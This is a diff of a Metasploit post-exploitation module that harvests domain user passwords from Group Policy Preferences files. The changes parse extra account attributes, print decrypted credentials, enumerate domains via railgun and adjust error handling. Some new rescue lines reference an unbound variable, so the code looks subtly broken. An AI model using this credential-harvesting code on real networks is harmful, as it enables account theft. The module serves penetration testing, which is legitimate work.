@@ -147,7 +147,15 @@ class Metasploit3 < Msf::Post
 			user = node.attributes['userName']
 			newname = node.attributes['newName']
 			disabled = node.attributes['acctDisabled']
-			changed = node.attributes['changed']
+			action = node.attributes['action']
+			expires = node.attributes['expires']
+			never_expires = node.attributes['neverExpires']
+			description = node.attributes['description']
+			full_name = node.attributes['fullName']
+			no_change = node.attributes['noChange']
+			change_logon = node.attributes['changeLogon']
+			sub_authority = node.attributes['subAuthority']
+			changed = node.parent.attributes['changed'] # n.b. parent attribute.
 
 			# Check if policy also specifies the user is renamed.
 			if !newname.to_s.empty?
@@ -158,11 +166,7 @@ class Metasploit3 < Msf::Post
 
 			# UNICODE conversion
 			pass = pass.unpack('v*').pack('C*')
-			print_good(
-				%Q{
-				"DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} 
-				DISABLED: #{disabled} CHANGED: #{changed}"
-				})
+			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} DISABLED: #{disabled} CHANGED: #{changed}"
 
 			if session.db_record
 				source_id = session.db_record.id
@@ -197,7 +201,7 @@ class Metasploit3 < Msf::Post
 
 	def enum_domains
 		print_status "Enumerating Domains on the Network..."
-		domain_enum = 80000000 # SV_TYPE_DOMAIN_ENUM =  hex 80000000
+		domain_enum = 80000000 # SV_TYPE_DOMAIN_ENUM
 		buffersize = 500
 		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
 		# Estimate new buffer size on percentage recovered.
@@ -216,14 +220,15 @@ class Metasploit3 < Msf::Post
 		base = 0
 		domains = []
 		mem = client.railgun.memread(startmem, 8*count)
-		count.times{|i|
+		count.times do |i|
 				x = {}
 				x[:platform] = mem[(base + 0),4].unpack("V*")[0]
 				nameptr = mem[(base + 4),4].unpack("V*")[0]
 				x[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
 				domains << x
 				base = base + 8
-			}
+		end
+
 		return domains
 	end
 
@@ -270,7 +275,9 @@ class Metasploit3 < Msf::Post
 			value = v.data
 			open_key.close
 		rescue
+			print_error e.message
 		end
+
 		return value
 	end
 
@@ -281,9 +288,15 @@ class Metasploit3 < Msf::Post
 			v_name = "DCName"
 			domain = reg_getvaldata(subkey, v_name)
 		rescue
-			print_error "This host is not part of a domain."
+			print_error e.message 
 		end
-		return domain.sub!(/\\\\/,'')
+
+		if domain.nil?
+			print_error "No domain controller retrieved - is this machine part of a domain?"
+			return nil
+		else
+			return domain.sub!(/\\\\/,'')
+		end
 	end
 end
 
